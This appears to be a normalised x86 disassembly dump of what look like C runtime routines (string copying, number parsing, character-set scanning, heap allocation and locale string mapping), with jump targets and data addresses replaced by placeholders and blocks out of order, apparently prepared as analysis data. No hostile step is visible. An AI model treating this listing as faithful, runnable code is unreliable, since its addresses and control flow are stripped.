cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_405ca6
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_405c3e
add esp 0x14
mov eax esi
jmp r-xdata
sub_40db51
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_405ca6
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_405ca6
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_405c3e
add esp 0x14
mov eax esi
jmp r-xdata
sub_40dbb9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_40dc04
push 0xc
push r--data
call sub_405254
push 0xe
call sub_40917b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40dc6b
call sub_405299
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_404db5
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_404db5
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_40dc80
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40dd08
push 0xc
push r--data
call sub_405254
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_405ca6
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_405c3e
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_405299
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_409c81
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_40998d
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40de04
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_4046e0
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_40de26
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_40deb0
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_40dedd
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_407138
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_40f0a5
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_40df67
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_404db5
pop ecx
sub_40df87
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_40f0e3
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4045c5
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_40f12c
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_404db5
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_404db5
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40df67
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_4050ad
pop ecx
cmp eax ebx
je r-xdata
call sub_40f2e0
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_4046e0
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_40f12c
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_4050ad
pop ecx
cmp eax ebx
je r-xdata
call sub_40f2e0
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_40df67
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_40df67
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_4050ad
pop ecx
cmp eax ebx
je r-xdata
call sub_40f2e0
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_40e32c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40df87
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40e371
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_40f0e3
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4045c5
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_40f12c
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_404db5
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_4046e0
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40df67
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_4050ad
pop ecx
cmp eax ebx
je r-xdata
call sub_40f2e0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_40e52b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40e371
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40e56d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_404db5
push [ esi + 0x8 ]
call sub_404db5
push [ esi + 0xc ]
call sub_404db5
push [ esi + 0x10 ]
call sub_404db5
push [ esi + 0x14 ]
call sub_404db5
push [ esi + 0x18 ]
call sub_404db5
push [ esi ]
call sub_404db5
push [ esi + 0x20 ]
call sub_404db5
push [ esi + 0x24 ]
call sub_404db5
push [ esi + 0x28 ]
call sub_404db5
push [ esi + 0x2c ]
call sub_404db5
push [ esi + 0x30 ]
call sub_404db5
push [ esi + 0x34 ]
call sub_404db5
push [ esi + 0x1c ]
call sub_404db5
push [ esi + 0x38 ]
call sub_404db5
push [ esi + 0x3c ]
call sub_404db5
add esp 0x40
push [ esi + 0x40 ]
call sub_404db5
push [ esi + 0x44 ]
call sub_404db5
push [ esi + 0x48 ]
call sub_404db5
push [ esi + 0x4c ]
call sub_404db5
push [ esi + 0x50 ]
call sub_404db5
push [ esi + 0x54 ]
call sub_404db5
push [ esi + 0x58 ]
call sub_404db5
push [ esi + 0x5c ]
call sub_404db5
push [ esi + 0x60 ]
call sub_404db5
push [ esi + 0x64 ]
call sub_404db5
push [ esi + 0x68 ]
call sub_404db5
push [ esi + 0x6c ]
call sub_404db5
push [ esi + 0x70 ]
call sub_404db5
push [ esi + 0x74 ]
call sub_404db5
push [ esi + 0x78 ]
call sub_404db5
push [ esi + 0x7c ]
call sub_404db5
add esp 0x40
push [ esi + 0x80 ]
call sub_404db5
push [ esi + 0x84 ]
call sub_404db5
push [ esi + 0x88 ]
call sub_404db5
push [ esi + 0x8c ]
call sub_404db5
push [ esi + 0x90 ]
call sub_404db5
push [ esi + 0x94 ]
call sub_404db5
push [ esi + 0x98 ]
call sub_404db5
push [ esi + 0x9c ]
call sub_404db5
push [ esi + 0xa0 ]
call sub_404db5
push [ esi + 0xa4 ]
call sub_404db5
push [ esi + 0xa8 ]
call sub_404db5
add esp 0x2c
sub_40e702
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404db5
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404db5
pop ecx
push esi
call sub_404db5
pop ecx
sub_40e747
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404db5
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404db5
pop ecx
push esi
call sub_404db5
pop ecx
sub_40e7e0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_40e826
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_40e8f0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40e939
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_407138
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_405ca6
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_40f322
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_405ca6
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
